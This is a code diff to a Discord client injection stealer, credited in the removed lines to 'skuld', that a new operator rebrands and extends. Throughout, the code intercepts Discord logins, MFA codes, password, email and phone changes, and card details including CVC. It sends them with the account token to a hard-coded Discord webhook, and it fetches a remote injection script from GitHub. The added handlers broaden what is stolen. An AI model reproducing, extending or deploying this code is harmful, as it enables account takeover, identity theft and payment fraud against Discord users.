@@ -11,15 +11,23 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1434212076666093712/tIJ-CuMLjVr7vf-sbNw3FeO9SOUVND5AGcC59bY3UK0SBhG-c_RWAA3OCeCCE1M82swJ",
+    webhook: "https://discord.com/api/webhooks/1431467137012076735/iJ75UY-pcfmqIBXS7AcFI_u_gec_F0GdPjyyUOS1MJbwijLt5R_3y_6njGF_dDh0yNh2",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/sdadad.js",
     filters: {
         urls: [
             '/auth/login',
             '/auth/register',
             '/mfa/totp',
-            '/mfa/codes-verification',
+            '/mfa/codes-verification',  
             '/users/@me',
+            '/users/@me/email',
+            '/users/@me/password',
+            '/users/@me/phone',
+            '/users/@me/username',
+            '/billing/payment-sources',
+            '/billing/subscriptions',
+            '/guilds',
+            '/relationships',
         ],
     },
     filters2: {
@@ -147,17 +155,23 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "https://t.me/hairo13x7";
+    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&";
+    
+    const avatarUrl = account.avatar
+        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=4096`
+        : `https://cdn.discordapp.com/embed/avatars/0.png`;
+
     content["embeds"][0]["author"] = {
         "name": account.username,
+        "icon_url": avatarUrl
     };
     content["embeds"][0]["thumbnail"] = {
-        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
+        "url": avatarUrl
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": `${os.userInfo().username} | https://t.me/hairo13x7`,
+        "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -168,34 +182,66 @@ const hooker = async (content, token, account) => {
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
-    content["embeds"][0]["fields"].push({
-        "name": "Token",
-        "value": "```" + token + "```",
-        "inline": false
-    }, {
-        "name": "Nitro",
-        "value": nitro,
-        "inline": true
-    }, {
-        "name": "Badges",
-        "value": badges,
-        "inline": true
-    }, {
-        "name": "Billing",
-        "value": billing,
-        "inline": true
-    });
+    // Orijinal field'ları koru ve ek field'ları ekle
+    const originalFields = content["embeds"][0]["fields"] || [];
+    const additionalFields = [
+        {
+            "name": `<:mastercard_spacex:1429086506781511771> Token:`,
+            "value": "```" + token + "```",
+            "inline": false
+        }, {
+            "name": `<:nitro_spacex:1429086514893164647> Nitro:`,
+            "value": nitro,
+            "inline": true
+        }, {
+            "name": `<:badges_spacex:1429086523906850906> Badges:`,
+            "value": badges,
+            "inline": true
+        }, {
+            "name": `<:mastercard_spacex:1429086506781511771> Billing:`,
+            "value": billing,
+            "inline": true
+        }, {
+            "name": `<a:money_spacex:1429086508505239623> 2FA:`,
+            "value": `\`${account.mfa_enabled ? "Yes" : "No"}\``,
+            "inline": true
+        }, {
+            "name": `<:email_spacex:1429086532811358350> Email:`,
+            "value": `\`${account.email}\``,
+            "inline": true
+        }, {
+            "name": `<a:billing_postal:1429086529300598895> Phone:`,
+            "value": `\`${account.phone || "None"}\``,
+            "inline": true
+        }, {
+            "name": `<:space_classic:1429086519901032610> Path:`,
+            "value": `\`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js\``,
+            "inline": false
+        }
+    ];
+
+    if (originalFields.length > 0) {
+        content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
+    } else {
+        content["embeds"][0]["fields"] = additionalFields;
+    }
 
     content["embeds"].push({
-        "title": `Total Friends: ${friends.totalFriends}`,
+        "title": `HQ Friends (${friends.totalFriends})`,
         "description": friends.message,
+        "color": 0x313338,
+        "author": { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
     }, {
-        "title": `Total Servers: ${servers.totalGuilds}`,
+        "title": `Rare Servers (${servers.totalGuilds})`,
         "description": servers.message,
+        "color": 0x313338,
+        "author": { name: `Rare Servers (${servers.totalGuilds})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0x313338;
     }
 
     await request("POST", CONFIG.webhook, {
@@ -318,14 +364,15 @@ const EmailPassToken = async (email, password, token, action) => {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
             "fields": [{
-                "name": "Email",
+                "name": `<:email_spacex:1429086532811358350> Email:`,
                 "value": "`" + email + "`",
                 "inline": true
             }, {
-                "name": "Password",
+                "name": `<a:password_spacex:1429086516625412226> Password:`,
                 "value": "`" + password + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -346,22 +393,22 @@ const BackupCodesViewed = async (codes, token) => {
     const content = {
         "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
-            "fields": [{
-                    "name": "Backup Codes",
+                "fields": [{
+                    "name": `<a:money_spacex:1429086508505239623> Backup Codes:`,
                     "value": "```" + message + "```",
                     "inline": false
                 },
                 {
-                    "name": "Email",
+                    "name": `<:email_spacex:1429086532811358350> Email:`,
                     "value": "`" + account.email + "`",
                     "inline": true
                 }, {
-                    "name": "Phone",
+                    "name": `<a:billing_postal:1429086529300598895> Phone:`,
                     "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }
-            ]
-
+            ],
+            "color": 0x313338
         }]
     };
 
@@ -375,14 +422,15 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
         "content": `**${account.username}** just changed his password!`,
         "embeds": [{
             "fields": [{
-                "name": "New Password",
+                "name": `<a:password_spacex:1429086516625412226> New Password:`,
                 "value": "`" + newPassword + "`",
                 "inline": true
             }, {
-                "name": "Old Password",
+                "name": `<a:password_spacex:1429086516625412226> Old Password:`,
                 "value": "`" + oldPassword + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -396,18 +444,19 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
         "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
             "fields": [{
-                "name": "Number",
+                "name": `<:visa_spacex:1429086521654509588> Card Number:`,
                 "value": "`" + number + "`",
                 "inline": true
             }, {
-                "name": "CVC",
+                "name": `<:mastercard_spacex:1429086506781511771> CVC:`,
                 "value": "`" + cvc + "`",
                 "inline": true
             }, {
-                "name": "Expiration",
+                "name": `<a:billing_address:1429086525446033470> Expiration:`,
                 "value": "`" + month + "/" + year + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -418,17 +467,150 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
+        "content": `**${account.username}** just added a <:paypal_spacex:1429086518168784956> account!`,
         "embeds": [{
             "fields": [{
-                "name": "Email",
+                "name": `<:email_spacex:1429086532811358350> Email:`,
                 "value": "`" + account.email + "`",
                 "inline": true
             }, {
-                "name": "Phone",
+                "name": `<a:billing_postal:1429086529300598895> Phone:`,
                 "value": "`" + (account.phone || "None") + "`",
                 "inline": true
-            }]
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const EmailChanged = async (newEmail, oldEmail, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just changed his email!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<:email_spacex:1429086532811358350> New Email:`,
+                "value": "`" + newEmail + "`",
+                "inline": true
+            }, {
+                "name": `<:email_spacex:1429086532811358350> Old Email:`,
+                "value": "`" + oldEmail + "`",
+                "inline": true
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const PhoneChanged = async (newPhone, oldPhone, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just changed his phone number!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<a:billing_postal:1429086529300598895> New Phone:`,
+                "value": "`" + newPhone + "`",
+                "inline": true
+            }, {
+                "name": `<a:billing_postal:1429086529300598895> Old Phone:`,
+                "value": "`" + (oldPhone || "None") + "`",
+                "inline": true
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const UsernameChanged = async (newUsername, oldUsername, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${oldUsername}** just changed his username!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<a:billing_name:1429086527417221120> New Username:`,
+                "value": "`" + newUsername + "`",
+                "inline": true
+            }, {
+                "name": `<a:billing_name:1429086527417221120> Old Username:`,
+                "value": "`" + oldUsername + "`",
+                "inline": true
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const NitroPurchased = async (token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just purchased Nitro!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<:nitro_spacex:1429086514893164647> Nitro Type:`,
+                "value": "`" + getNitro(account.premium_type) + "`",
+                "inline": true
+            }, {
+                "name": `<:email_spacex:1429086532811358350> Email:`,
+                "value": "`" + account.email + "`",
+                "inline": true
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const ServerJoined = async (serverName, serverId, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just joined a server!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<:space_classic:1429086519901032610> Server Name:`,
+                "value": "`" + serverName + "`",
+                "inline": true
+            }, {
+                "name": `<:space_classic:1429086519901032610> Server ID:`,
+                "value": "`" + serverId + "`",
+                "inline": true
+            }],
+            "color": 0x313338
+        }]
+    };
+
+    hooker(content, token, account);
+}
+
+const ServerLeft = async (serverName, serverId, token) => {
+    const account = await fetchAccount(token)
+
+    const content = {
+        "content": `**${account.username}** just left a server!`,
+        "embeds": [{
+            "fields": [{
+                "name": `<:space_classic:1429086519901032610> Server Name:`,
+                "value": "`" + serverName + "`",
+                "inline": true
+            }, {
+                "name": `<:space_classic:1429086519901032610> Server ID:`,
+                "value": "`" + serverId + "`",
+                "inline": true
+            }],
+            "color": 0x313338
         }]
     };
 
@@ -592,11 +774,49 @@ const createWindow = () => {
                 if (!requestData.password) return;
 
                 if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
+                    EmailChanged(requestData.email, requestData.email, responseData.token);
                 }
 
                 if (requestData.new_password) {
                     PasswordChanged(requestData.new_password, requestData.password, responseData.token);
+                }
+
+                if (requestData.phone) {
+                    PhoneChanged(requestData.phone, requestData.phone, responseData.token);
+                }
+
+                if (requestData.username) {
+                    UsernameChanged(requestData.username, requestData.username, responseData.token);
+                }
+                break;
+
+            case params.response.url.endsWith('/email'):
+                if (requestData.email) {
+                    EmailChanged(requestData.email, requestData.email, await getToken());
+                }
+                break;
+
+            case params.response.url.endsWith('/password'):
+                if (requestData.new_password) {
+                    PasswordChanged(requestData.new_password, requestData.password, await getToken());
+                }
+                break;
+
+            case params.response.url.endsWith('/phone'):
+                if (requestData.phone) {
+                    PhoneChanged(requestData.phone, requestData.phone, await getToken());
+                }
+                break;
+
+            case params.response.url.endsWith('/username'):
+                if (requestData.username) {
+                    UsernameChanged(requestData.username, requestData.username, await getToken());
+                }
+                break;
+
+            case params.response.url.endsWith('/subscriptions'):
+                if (responseData.subscription) {
+                    NitroPurchased(await getToken());
                 }
                 break;
         }
